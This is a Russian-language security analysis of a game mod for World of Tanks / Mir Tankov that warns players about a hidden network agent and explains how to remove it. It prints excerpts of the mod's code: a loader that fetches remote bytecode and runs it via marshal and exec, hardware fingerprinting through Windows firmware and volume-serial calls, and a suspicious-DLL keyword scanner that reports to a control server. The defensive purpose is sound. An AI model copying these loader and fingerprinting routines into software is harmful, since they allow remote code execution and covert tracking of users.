## 1. Главный вердикт: Вирус ли это?

* **Классический вирус (троян-стилер, вымогатель, майнер):** **НЕТ.**  
  Модификация не занимается кражей паролей из браузеров, не ворует сессии, не шифрует файлы на диске и не прописывается в автозагрузку операционной системы.
* **Категория по классификации кибербезопасности:** **Greyware / Riskware / Неконтролируемый сетевой дроппер (Dynamic Code Dropper).**  
  Мод содержит полноценного сетевого агента (внутреннее название разработчиков — **«Миньон» (Minion)**), который во время каждого боя связывается с удаленным C2-сервером и способен **скачивать и выполнять на вашем компьютере любой бинарный Python-код в обход антивирусов**.

## 2. Детальный разбор рисков по файлам и компонентам

### 🚨 РИСК №1: Неконтролируемое удаленное исполнение кода (RCE / Дроппер)
* **Файл:** `modsdk_hook.py` (внутренний модуль `importer.py`)
* **Что происходит:**  
  В память игры устанавливается скрытый перехватчик импорта `ServerImporter` (`sys.meta_path`). При запросе модулей мод обращается по защищенному WebSocket-соединению к серверу авторов чита, скачивает скомпилированный байткод и напрямую исполняет его функциями `marshal.loads()` и `exec`.
* **Пример кода из мода (`importer.py`):**
  ```python
  class ServerImporter(object):
      """sys.meta_path finder+loader для секретных модулей с сервера.
      Всё тянется с сервера через ProtoClient.get_module_verified() и exec'ится."""
      def load_module(self, fullname):
          module_name = fullname[len(self.prefix) + 1:]
          # 1. Скачивание полезной нагрузки по сети
          signed_payload = self.client.get_module_verified(module_name)
          # 2. Десериализация бинарного байткода
          code_obj = marshal.loads(signed_payload)
          # 3. Исполнение на компьютере пользователя
          mod = imp.new_module(fullname)
          sys.modules[fullname] = mod
          exec code_obj in mod.__dict__
          return mod
  ```
* **В чём опасность для игрока:**  
  Пользователь не контролирует, что именно сервер пришлёт на его ПК. Сегодня это вспомогательный скрипт, а завтра разработчик мода или злоумышленник, перехвативший сервер, может отправить код, который загрузит настоящий вредоносный файл, украдёт данные или повредит систему.

### 🚨 РИСК №2: Скрытый сбор аппаратных идентификаторов ПК (HWID Spying)
* **Файл:** `modsdk_hook.py` (внутренний модуль `hwid.py`)
* **Что происходит:**  
  Модуль намеренно обходит стандартные утилиты вроде `wmic.exe` (чтобы не привлекать внимание встроенного антивируса Windows Defender) и напрямую через `ctypes` вызывает функции ядра Windows `kernel32.dll`. Он читает системные таблицы BIOS/SMBIOS, уникальный серийный номер материнской платы и серийные номера томов жестких дисков.
* **Пример кода из мода (`hwid.py`):**
  ```python
  # Вычисление HWID миньона БЕЗ wmic и БЕЗ дропа .exe
  def _firmware_rsmb():
      # Чтение сырой таблицы SMBIOS из прошивки материнской платы
      fn = ctypes.windll.kernel32.GetSystemFirmwareTable
      fn.restype = ctypes.c_uint
      fn.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p, ctypes.c_uint]
      need = fn(0x52534D42, 0, None, 0) # 0x52534D42 = 'RSMB'
      buf = ctypes.create_string_buffer(int(need))
      got = fn(0x52534D42, 0, buf, int(need))
      return buf.raw[:int(got)]

  def _vol_serial():
      # Чтение серийного номера системного диска
      sn = ctypes.c_ulong()
      ctypes.windll.kernel32.GetVolumeInformationW(
          ctypes.c_wchar_p(u'C:\\'), None, 0, ctypes.byref(sn), None, None, None, 0
      )
      return hex(sn.value)
  ```
* **В чём опасность для игрока:**  
  Полная деанонимизация. Данные уникального «отпечатка» вашего ПК привязываются на сервере к игровому аккаунту и IP-адресу.

### 🚨 РИСК №3: Слежка за процессами и отправка отчётов («Стукач»)
* **Файл:** `modsdk_hook.py` (внутренний модуль `anti.py`)
* **Что происходит:**  
  Модуль постоянно инспектирует все динамические библиотеки (DLL), загруженные в процесс игры. Он ищет отладчики, реверс-инструменты и снифферы (`frida`, `injector`, `dumper`, `pydevd`, `debugpy`, `pdb`, `remote_console`, `wot_repl`). При их обнаружении немедленно отправляет отчёт с описанием окружения на сервер в модуль `AbusePolicy.record()`.
* **Пример кода из мода (`anti.py`):**
  ```python
  def _check_susp_dlls():
      # Сканирование всех загруженных в игру DLL через psapi
      psapi = ctypes.windll.psapi
      h_proc = ctypes.windll.kernel32.GetCurrentProcess()
      needed = ctypes.c_ulong()
      psapi.EnumProcessModules(h_proc, None, 0, ctypes.byref(needed))
      # Проверка имен модулей на ключевые слова
      for m in mods:
          if psapi.GetModuleFileNameExA(h_proc, m, buf, 512):
              dll_path = buf.value.lower()
              if any(bad in dll_path for bad in ['inject', 'hook', 'frida', 'dumper']):
                  # Отправка отчета на сервер
                  proto_client.report_suspicious('dll_inject', dll_path)
  ```
* **В чём опасность для игрока:**  
  Фоновая активность программы собирает сведения о запущенном у вас программном обеспечении без вашего согласия.

### 🚨 РИСК №4: Сеть «миньонов» и передача информации
* **Файл:** `modsdk_hook.py` (внутренний модуль `agent.py`)
* **Что происходит:**  
  В момент загрузки боя модуль перехватывает событие `onAvatarBecomePlayer`, считывает ID игровой арены, номер команды и ID аккаунта и передаёт их на C2-сервер сети:
  ```python
  def arm(self):
      arena = getattr(BigWorld.player(), 'arena', None)
      arena_id = arena.arenaUniqueID if arena else 0
      team = getattr(BigWorld.player(), 'team', 0)
      account_id = getattr(BigWorld.player(), 'id', 0)
      # Передача данных на сервер: minion_team != 0
      self.client.set_arena(arena_id, team, account_id)
  ```
* **В чём опасность для игрока:**  
  Ваш аккаунт становится узлом централизованной сети. Если разработчики игры отследят серверную инфраструктуру EvilMod, все аккаунты, фигурировавшие в сессиях C2-сервера, гарантированно попадают в списки блокировки.

### 🚨 РИСК №5: Перманентная блокировка аккаунта (Бан по правилам игры)
* **Файл:** `armorflashlight/afl_battle.py`
* **Что происходит:**  
  Несмотря на то, что мод визуально повторяет официальную механику «Фонарика бронепробития» из европейского клиента WoT 2.x, в клиенте **«Мир Танков» (Lesta)** эта механика отсутствует в открытом доступе.
  Более того, в коде `afl_battle.py` реализована **трассировка сквозь разрушаемые объекты и кусты**:
  ```python
  # Проверка пробития сквозь препятствия
  def _through_destr(self, hit_point, target_vehicle):
      # Если препятствие разрушаемое (заборы, стены, авто) -
      # подсветка зон пробития за ним НЕ выключается!
  ```
* **В чём опасность для игрока:**  
  По регламенту проекта «Мир Танков» подсветка зон пробиваемости за препятствиями и модификации, изменяющие прозрачность крон деревьев или трассирующие броню вне прямой видимости, классифицируются как **запрещенные модификации **. Использование мода в оригинальном виде влечёт за собой блокировку аккаунта (первое предупреждение — 7 дней, повторно — перманентный бан).

## 3. Инструкция: Как полностью очистить мод от рисков

Если вы хотите использовать только визуальный интерфейс фонарика и ангарный инспектор, полностью отключив шпионские и сетевые функции:

1. **Отвязать сетевой загрузчик:**  
   В файле `armorflashlight/__init__.py` найдите функцию `_start_modsdk` и замените её на пустую заглушку:
   ```python
   def _start_modsdk():
       pass
   ```
2. **Удалить файл `modsdk_hook.py`:**  
   Полностью удалите модуль `modsdk_hook.py` из проекта.
3. **Отключить пробитие сквозь объекты:**  
   В файле настроек `res_mods/configs/evilmod.armorflashlight.json` отключите параметры:
   ```json
   "shotFromMuzzle": false,
   "overTargetDetails": false
   ```

После этого мод становится полностью автономным, не обращается в интернет и не собирает информацию о вашем компьютере.
